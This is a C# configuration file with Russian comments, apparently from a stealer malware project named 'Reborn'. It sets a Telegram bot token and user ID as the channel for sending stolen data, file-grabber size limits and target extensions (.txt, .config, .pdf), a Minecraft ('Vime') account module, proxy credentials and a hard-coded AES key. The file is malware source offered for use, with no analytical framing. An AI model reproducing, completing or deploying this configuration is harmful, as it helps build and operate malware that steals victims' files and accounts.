using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Reborn
{
    class Config
    {
        // Токен телеграма
        public static readonly string Token = "";

        // Айди пользователя
        public static readonly string ID = "";

        public static readonly bool Developer = false;

        // Вайм модуль
        public static readonly bool MinecraftModule = true;

        // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int sizefile = 2500000;
        
        public static string ip = ""; // IP Proxy
        public static int port = 0; // Порт Proxy
        public static string login = ""; // Логин Proxy
        public static string password = ""; // Пароль Proxy

        // Секретный Ключ AES
        public static string key = "Ql9.9e";
        
        // Список расширений для сбора файлов
        public static string[] expansion = new string[]
        {
          ".txt", ".config", "", ".pdf"
        };
    }
}
